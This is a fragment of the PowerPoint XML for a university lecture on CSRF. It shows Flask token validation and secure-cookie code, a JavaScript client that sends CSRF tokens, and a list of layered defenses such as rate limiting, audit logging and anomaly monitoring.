            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>')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if not token or not </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>server_token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>            abort(403, description='CSRF token missing')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if not </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>hmac.compare_digest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>(token, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>server_token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    abort(403, description='CSRF token invalid')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>@app.after_request</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>set_secure_cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>(response):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response.set_cookie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'session',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session.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>session_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>', ''),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httponly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>=True,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>        secure=True,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samesite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>='Strict',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max_age</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>=3600</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>    )</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>    return response</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="351796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225E61-C42C-4D07-B314-6383CB4DFAA1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048740" y="13936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Defense-in-Depth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45C8F-7949-438B-8DAD-287877D78DD9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005395" y="662588"/>
            <a:ext cx="6780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Layer 2: Client-Side (JavaScript) / Save with JavaScript Extension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64413-9F05-4B96-8E3F-78101983881A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1464816" y="1346537"/>
            <a:ext cx="698450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class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>SecureAPIClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>    constructor(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>baseUrl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this.baseUrl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>baseUrl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>; 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this.csrfToken</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> = null;     }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async </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>init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const response = await fetch(`${</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>this.baseUrl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>}/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>api</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>csrf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>-token`);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>        const data = await </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>response.json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this.csrfToken</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>data.csrf_token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>;     }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async post(endpoint, data) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>        return fetch(`${</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>this.baseUrl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>}${endpoint}`, {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>            method: 'POST',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>            headers: {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>                'Content-Type': 'application/json',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>                'X-CSRF-Token': </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>this.csrfToken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      'X-Requested-With': '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>XMLHttpRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>            },</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>            credentials: 'same-origin',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>            body: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>JSON.stringify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>(data)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>        });     }}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="102919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225E61-C42C-4D07-B314-6383CB4DFAA1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048740" y="13936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Defense-in-Depth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DDEC2-C981-4D44-9EDC-FA54A4E7492C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1049045" y="1166842"/>
            <a:ext cx="80942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Layer 3: Network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WAF rules to detect CSRF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Rate limiting per user/IP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Anomaly detection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Layer 4: Application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Re-authentication for sensitive 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Audit logging of all state changes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Transaction confirmation emails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Layer 5: Monitoring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Real-time alerting on unusual transfer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Geographic anomaly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Velocity checks (multiple transfers in short time)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19598315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137</TotalTime>
  <Words>2187</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>340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-apple-system</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>system-ui</vt:lpstr>
      <vt:lpstr>Retrospect</vt:lpstr>
      <vt:lpstr>Cross-Site Request Forgery (CSRF)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Ahmad Nawaz Lecturer FCSE</dc:creator>
  <cp:lastModifiedBy>Muhammad Ahmad Nawaz Lecturer FCSE</cp:lastModifiedBy>
  <cp:revision>23</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-02-26T06:50:36Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-02T07:15:47Z</dcterms:modified>
</cp:coreProperties>
</file>